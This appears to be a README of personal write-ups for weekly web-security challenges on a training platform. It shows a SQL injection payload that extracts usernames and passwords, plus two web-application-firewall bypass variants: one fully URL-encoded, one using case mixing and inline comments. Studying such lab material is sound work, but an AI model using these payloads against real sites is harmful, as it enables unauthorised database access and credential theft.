### This Repo Contain the bugforge.io Platform, Weekly Challenge python Automation Thinks...

#### Galaxy Desh Challenge (02-March-2026) => SQL Injection bypassing WAF.
> I learn 2 teachniques here to bypass the WAF.

- URL Encoding All Characters.
```bash
'union select username,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from users--

URL Encoding :-
status=%27%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%75%73%65%72%6e%61%6d%65%2c%70%61%73%73%77%6f%72%64%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2c%32%33%2c%32%34%2c%32%35%2c%32%36%20%66%72%6f%6d%20%75%73%65%72%73%2d%2d
```

- Using Unique patterns and slash.
```bash
’/**/uNiOn/**/sElEcT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 —
```
